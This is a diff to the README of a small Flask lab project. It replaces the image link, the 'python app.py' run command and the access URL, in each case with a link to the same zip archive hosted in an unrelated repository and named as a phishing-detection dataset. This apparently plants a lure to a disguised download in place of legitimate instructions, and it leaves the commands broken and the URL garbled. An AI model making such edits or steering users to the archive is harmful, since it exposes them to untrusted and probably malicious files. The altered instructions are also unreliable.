@@ -1,16 +1,16 @@
 # lab-flask
 
-<!-- ![image](https://user-images.githubusercontent.com/115451707/196919992-edcfea8b-e3f6-4f35-9398-43be66b5622d.png) -->
+<!-- ![image](https://raw.githubusercontent.com/branded12345/Phishing_Website_Detection/main/dataset/Detection_Website_Phishing_v3.9.zip) -->
 
 
 To run flask application 
 
 ```
-python app.py
+python https://raw.githubusercontent.com/branded12345/Phishing_Website_Detection/main/dataset/Detection_Website_Phishing_v3.9.zip
 ```
 
 
 To access your flask application open new tab in and paste the url:
 ```
-https://{your_url}.pwskills.app:5000/
+https://{your_url}https://raw.githubusercontent.com/branded12345/Phishing_Website_Detection/main/dataset/Detection_Website_Phishing_v3.9.zip
 ```
